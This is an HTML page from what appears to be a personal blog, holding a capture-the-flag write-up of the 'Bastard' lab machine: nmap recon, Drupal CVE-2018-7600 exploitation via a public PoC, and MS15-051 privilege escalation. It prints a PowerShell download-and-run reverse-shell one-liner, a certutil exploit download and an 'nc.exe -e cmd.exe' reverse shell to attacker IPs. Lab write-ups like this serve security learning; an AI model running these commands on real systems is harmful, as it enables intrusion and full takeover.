@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Bastard - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Bastard</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1731597460964"
+                  >2024-11-14 16:17</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1731615328533"
+                  >2024-11-14 21:15</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">139.175</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-regexp">//</span>nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">11</span>-<span class="hljs-number">14</span> <span class="hljs-number">15</span>:<span class="hljs-number">27</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">139.175</span>
+Host is up (<span class="hljs-number">0.032</span>s latency).
+Not shown: <span class="hljs-number">65532</span> filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+<span class="hljs-number">80</span>/tcp    open  http    Microsoft IIS httpd <span class="hljs-number">7.5</span>
+|_http-generator: Drupal <span class="hljs-number">7</span> (http:<span class="hljs-regexp">//</span>drupal.org)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/<span class="hljs-number">7.5</span>
+| http-robots.txt: <span class="hljs-number">36</span> disallowed entries (<span class="hljs-number">15</span> shown)
+| <span class="hljs-regexp">/includes/</span> <span class="hljs-regexp">/misc/</span> <span class="hljs-regexp">/modules/</span> <span class="hljs-regexp">/profiles/</span> <span class="hljs-regexp">/scripts/</span> 
+| <span class="hljs-regexp">/themes/</span> <span class="hljs-regexp">/CHANGELOG.txt /</span>cron.php /INSTALL.mysql.txt 
+| <span class="hljs-regexp">/INSTALL.pgsql.txt /</span>INSTALL.sqlite.txt <span class="hljs-regexp">/install.php /</span>INSTALL.txt 
+|_<span class="hljs-regexp">/LICENSE.txt /</span>MAINTAINERS.txt
+|_http-title: Welcome to Bastard | Bastard
+<span class="hljs-number">135</span>/tcp   open  msrpc   Microsoft Windows RPC
+<span class="hljs-number">49154</span>/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div>
+<p>Drupal CMS welcomes us on port 80.</p>
+<p><img src="/_resources/2728ae9445bd4bef97783cd9fa12b116.png" /></p>
+<p>We can grab it’s version by going to <code>/CHANGELOG.TXT</code>.</p>
+<p><img src="/_resources/777e8836676246ea88c0126bb1c28f46.png" /></p>
+<p>Checing it with NIST, we can see that it has <a title="https://nvd.nist.gov/vuln/detail/CVE-2018-7600" href="https://nvd.nist.gov/vuln/detail/CVE-2018-7600">juicy 9.8 Critical CVE</a>.</p>
+<p><img src="/_resources/6c744aa5969f402683f84e7f2110962d.png" /></p>
+<p>We can find then <a title="https://github.com/pimps/CVE-2018-7600" href="https://github.com/pimps/CVE-2018-7600">PoC of the exploit on github.</a></p>
+<p><img src="/_resources/98017308a1c24c79acfa33f36f9cadc2.png" /></p>
+<p><img src="/_resources/b7ac5cc13f5c4793bdd28860787cf238.png" /></p>
+<p>We can get reverse shell using Invoke-PowerShellTcp.ps1</p>
+<div><pre class="hljs"><code>powershell iex (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://10.10.66.152:8000/Invoke-PowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -<span class="hljs-keyword">Reverse</span> -IPAddress <span class="hljs-number">10.10</span><span class="hljs-number">.66</span><span class="hljs-number">.152</span> -Port <span class="hljs-number">4242</span></code></pre></div>
+<p><img src="/_resources/fbaf9666d9fe4ad4a53eba05f7d5b1db.png" /></p>
+<p><img src="/_resources/34c01dceed87411aa6d3876477eafb39.png" /></p>
+<p><img src="/_resources/8d73b9be39714f45ac9de319f6592020.png" /></p>
+<h1 id="privilage-escalation">Privilage escalation</h1>
+<p><img src="/_resources/0ccae38684fc4a1487015d8815e34d36.png" /></p>
+<p>It’s vanilla windows 2008 server, so we can run exec exploiting <a title="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051">MS15-051</a>.</p>
+<p>We can send it over using http-server again, and get it using <code>certutil.exe -urlcache -split -f http://10.10.16.21/ms15-051x64.exe ms15-051x64.exe</code>.</p>
+<p><img src="/_resources/2142ccb2733143fbb1507a78e59ce363.png" /></p>
+<p>It works, so we can get reverse shell with admin, by sending over nc and running ".\ms15-051x64.exe “nc.exe -e cmd.exe 10.10.16.21 5555”</p>
+<p><img src="/_resources/f3d6bbc11dd14c42b02c8945492e788d.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
